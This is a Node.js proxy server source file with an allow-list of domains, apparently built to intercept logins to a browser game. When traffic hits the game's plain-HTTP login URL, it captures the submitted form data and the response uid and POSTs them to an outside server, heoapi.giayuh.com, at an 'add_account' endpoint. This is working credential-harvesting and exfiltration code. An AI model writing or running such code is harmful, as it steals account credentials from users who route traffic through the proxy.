const { networkInterfaces } = require('os');
const fs = require('fs');
const path = require('path');
const AVL = require('avl');

const fileAllow = path.join(__dirname, 'allow.json');
const listAllowProxy = new AVL();
const isSaveListAllowProxy = false;
loadList();

/// show lan
const nets = networkInterfaces();
for (const name of Object.keys(nets)) {
    for (const net of nets[name]) {
        if (net.family === 'IPv4' && !net.internal) {
            console.log(name, net.address);
        }
    }
}

// get & save list

function loadList() {
  const content = fs.readFileSync(fileAllow);
  const data = JSON.parse(content.toString('utf-8'));
  data.map(domain => {
    listAllowProxy.insert(domain);
  })
}

function saveDomain(domain) {
  if (listAllowProxy.find(domain)) {
    return;
  }
  listAllowProxy.insert(domain);
  console.log(domain);
  fs.writeFileSync(fileAllow, JSON.stringify(listAllowProxy.keys()));
}

// call add data
const request = require('request');
function addRequest(data) {
  request(
    'https://heoapi.giayuh.com/adm/add_account', 
    {
      method: "POST",
      json: data
    }, 
    (e, d) => {
      if (e) {
        console.log(e);
        return;
      }
      console.log(d.body);
    }
  )

}

// add data
const querystring = require('querystring');
function addUser(req, res) {
  const oReq= querystring.parse(req);
  const oRes = JSON.parse(res);
  console.log('capture uid: ', oRes._d.uid);

  const data = {
    uid:  oRes._d.uid,
    data: oReq
  }
  addRequest(data);
}

// Proxy
const httpProxy = require("http-proxy");
const http = require("http");
const url = require("url");
const net = require('net');
const zlib = require("zlib");

const server = http.createServer(function (req, res) {
  const urlObj = url.parse(req.url);
  const target = urlObj.protocol + "//" + urlObj.host;

  if (isSaveListAllowProxy) {
    saveDomain(urlObj.host);
  } else {
    if (!listAllowProxy.find(urlObj.host)) {
      // console.log('no', urlObj.host);
      res.destroy();
      return;
    }
  }

  const proxy = httpProxy.createProxyServer({});
  proxy.on("error", function (err, req, res) {
    console.log("proxy error", err);
    res.end();
  });

  const isSniff = req.url === "http://d2fd20abim5npz.cloudfront.net/planetpigth/m/gameNew/login/";
  if (isSniff) {
    console.log('sniff');

    let reqData = [];
    let resData = [];

    req.on('data', (chunk) => {
      reqData.push(chunk);
    })

    req.on('end', chunk => {
      reqData = Buffer.concat(reqData).toString();
    })

    proxy.on('proxyRes', function(proxyRes, req, res) {
      const gunzip = zlib.createGunzip();
      proxyRes.pipe(gunzip);

      gunzip.on('data', function (chunk) {
          resData.push(chunk);
      });
      gunzip.on('end', function () {
          resData = Buffer.concat(resData).toString();
          addUser(reqData, resData);
      });
    });
  } 

  proxy.web(req, res, {target: target});
}).listen(10001);


const getHostPortFromString = function (hostString, defaultPort) {
  let host = hostString;
  let port = defaultPort;
  const regex_hostport = /^([^:]+)(:([0-9]+))?$/;

  const result = regex_hostport.exec(hostString);
  if (result != null) {
    host = result[1];
    if (result[2] != null) {
      port = result[3];
    }
  }
  return ( [host, port] );
};

server.addListener('connect', function (req, socket, bodyhead) {
  const hostPort = getHostPortFromString(req.url, 443);
  const hostDomain = hostPort[0];
  const port = parseInt(hostPort[1]);

  if (isSaveListAllowProxy) {
    saveDomain(hostDomain);
  } else {
    if (!listAllowProxy.find(hostDomain)) {
      // console.log('no', hostDomain);
      socket.destroy();
      return;
    }
  }


  const proxySocket = new net.Socket();
  proxySocket.connect(port, hostDomain, function () {
      proxySocket.write(bodyhead);
      socket.write("HTTP/" + req.httpVersion + " 200 Connection established\r\n\r\n");
    }
  );

  proxySocket.on('data', function (chunk) {
    socket.write(chunk);
  });

  proxySocket.on('end', function () {
    socket.end();
  });

  proxySocket.on('error', function () {
    socket.write("HTTP/" + req.httpVersion + " 500 Connection error\r\n\r\n");
    socket.end();
  });

  socket.on('data', function (chunk) {
    proxySocket.write(chunk);
  });

  socket.on('end', function () {
    proxySocket.end();
  });

  socket.on('error', function () {
    proxySocket.end();
  });

});